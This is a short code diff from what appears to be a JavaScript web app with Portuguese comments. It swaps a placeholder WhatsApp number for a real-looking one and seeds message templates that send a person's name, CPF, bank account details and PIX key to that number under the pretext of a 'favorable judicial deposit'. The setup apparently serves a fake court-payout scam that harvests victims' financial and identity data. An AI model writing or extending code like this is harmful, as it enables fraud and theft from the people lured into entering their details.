@@ -91,7 +91,7 @@ db.exec(`
 
 // Inserir configurações padrão se não existirem
 const defaultConfigs = [
-  ['whatsapp_numero', '5511999999999'],
+  ['whatsapp_numero', '5531920047699'],
   ['whatsapp_mensagem', 'Olá, me chamo {nome} e estou entrando em contato referente ao processo {processo}.\n\nMeus dados bancários:\n*Banco:* {banco}\n*Agência:* {agencia}\n*Conta:* {conta} ({tipo_conta})\n*Titular:* {titular}\n*CPF Titular:* {cpf_titular}\n*PIX:* {pix}'],
   ['whatsapp_mensagem_nao_encontrado', 'Olá, meu nome é {nome}, CPF {cpf}, nascido em {data_nascimento}.\n\nO sistema não conseguiu encontrar meu processo! Gostaria de saber mais detalhes para que eu consiga fazer o cadastramento para meu depósito judicial favorável.'],
   ['protecao_ativa', 'true'],
